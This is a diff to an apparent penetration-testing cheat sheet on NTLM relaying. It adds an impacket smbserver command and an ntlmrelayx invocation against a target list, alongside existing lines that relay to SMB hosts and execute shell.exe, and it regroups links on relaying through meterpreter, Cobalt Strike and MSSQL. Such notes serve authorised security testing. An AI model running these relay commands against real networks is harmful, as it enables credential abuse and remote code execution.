@@ -16,6 +16,14 @@ $ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
 $ sudo ntlmrelayx -tf targets.txt -smb2support -e shell.exe
 ```
 
+- NTLM Relaying
+
+```
+$ smbserver -smb2support -port 8445 share $(pwd)
+
+$ ntlmrelayx.py -tf targets.txt -smb2support --no-http-server --no-wcf-server --no-raw-server
+```
+
 - Interactive shell with netcat
 
 ```
@@ -112,6 +120,16 @@ C:\> sc start netlogon
 
 - [How to Exploit Active Directory ACL Attack Paths Through LDAP Relaying Attacks](https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/)
 
-- [Rasta Mouse: NTLM Relaying via Cobalt Strike ](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
+### Scenarios
+
+#### Remote NTLM Relaying
+
+- [DiabloHorn: Remote NTLM relaying through meterpreter on Windows port 445](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/)
+
+- [Rasta Mouse: NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)
+
+- [Pentester's Promiscous Notebook: NTLM Relay](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ntlm/ntlm-relay)
+
+#### MSSQL
 
 - [Relaying NTLM to MSSQL](https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/)
